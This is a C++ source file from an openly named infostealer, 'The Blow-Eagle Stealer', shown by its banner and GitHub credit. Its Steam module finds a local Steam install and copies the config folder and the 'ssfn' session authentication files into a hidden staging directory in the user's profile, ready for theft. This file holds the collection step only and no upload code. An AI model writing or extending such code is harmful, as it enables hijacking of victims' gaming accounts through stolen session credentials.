/*
|==================================================================================================================|
|████████╗██╗░░██╗███████╗  ██████╗░██╗░░░░░░█████╗░░██╗░░░░░░░██╗░░░░░░███████╗░█████╗░░██████╗░██╗░░░░░███████╗ |
|╚══██╔══╝██║░░██║██╔════╝  ██╔══██╗██║░░░░░██╔══██╗░██║░░██╗░░██║░░░░░░██╔════╝██╔══██╗██╔════╝░██║░░░░░██╔════╝ |
|░░░██║░░░███████║█████╗░░  ██████╦╝██║░░░░░██║░░██║░╚██╗████╗██╔╝█████╗█████╗░░███████║██║░░██╗░██║░░░░░█████╗░░ |
|░░░██║░░░██╔══██║██╔══╝░░  ██╔══██╗██║░░░░░██║░░██║░░████╔═████║░╚════╝██╔══╝░░██╔══██║██║░░╚██╗██║░░░░░██╔══╝░░ |
|░░░██║░░░██║░░██║███████╗  ██████╦╝███████╗╚█████╔╝░░╚██╔╝░╚██╔╝░░░░░░░███████╗██║░░██║╚██████╔╝███████╗███████╗ |
|░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═════╝░╚══════╝░╚════╝░░░░╚═╝░░░╚═╝░░░░░░░░╚══════╝╚═╝░░╚═╝░╚═════╝░╚══════╝╚══════╝ |
|                                                                                                                  |
|                               ░██████╗████████╗███████╗░█████╗░██╗░░░░░███████╗██████╗░                          |
|                               ██╔════╝╚══██╔══╝██╔════╝██╔══██╗██║░░░░░██╔════╝██╔══██╗                          |
|                               ╚█████╗░░░░██║░░░█████╗░░███████║██║░░░░░█████╗░░██████╔╝                          |
|                               ░╚═══██╗░░░██║░░░██╔══╝░░██╔══██║██║░░░░░██╔══╝░░██╔══██╗                          |
|                               ██████╔╝░░░██║░░░███████╗██║░░██║███████╗███████╗██║░░██║                          |
|                               ╚═════╝░░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚══════╝╚══════╝╚═╝░░╚═╝                          |
|==================================================================================================================|

-----------------------------------------------------------------
|by: Nick_Vinesmoke                                             |
|Autor github: https://github.com/Nick-Vinesmoke                |
|Original repo: https://github.com/Nick-Vinesmoke/The-Blow-Eagle|
-----------------------------------------------------------------
*/

#include "../targets.h"
#include "../../config/config.c"
#include  "../../helper/helper.h"




void gaming::Steam()
{
	printf("steam\n");
	if (std::filesystem::exists("C:/Program Files/Steam") || std::filesystem::exists("C:/Program Files (x86)/Steam"))
	{
		std::string files[] = {
		"C:/Program Files/Steam",
		"C:/Program Files (x86)/Steam",
		};
		std::string dirs[] = {
			"C:/Program Files/Steam/config",
			"C:/Program Files (x86)/Steam/config"
		};

		std::string user = func::GetUser();

		std::string defaultPaths[3] = {

			"C:/Users/" + user + config::path + "/Games",
			"C:/Users/" + user + config::path + "/Games/Steam",
			"C:/Users/" + user + config::path + "/Games/Steam/config"

		};

		try
		{
			for (size_t i = 0; i < std::size(defaultPaths); i++)
			{
				int result = _mkdir(defaultPaths[i].c_str());
			}

			try
			{
				int arrSize = 0;
				std::string* filesInDir = new std::string[arrSize];
				func::GetFilesInDir(files[0], filesInDir, arrSize);

				func::copyDirectory(dirs[0], defaultPaths[2]);
				for (size_t i = 0; i < arrSize; i++)
				{
					if (!filesInDir[i].find("ssfn")) {
						func::copyFile(files[1] + '/' + filesInDir[i], defaultPaths[1]);
					}
				}
			}
			catch (const char* error_message)
			{
				std::cout << error_message << std::endl;
			}

			try
			{
				int arrSize = 0;
				std::string* filesInDir = new std::string[arrSize];
				func::GetFilesInDir(files[1], filesInDir, arrSize);

				func::copyDirectory(dirs[1], defaultPaths[2]);
				for (size_t i = 0; i < arrSize; i++)
				{
					if (!filesInDir[i].find("ssfn")) {
						func::copyFile(files[1] + '/' + filesInDir[i], defaultPaths[1]);
					}

				}
			}
			catch (const char* error_message)
			{
				std::cout << error_message << std::endl;
			}

		}
		catch (const char* error_message)
		{
			std::cout << error_message << std::endl;
		}
	}
	

}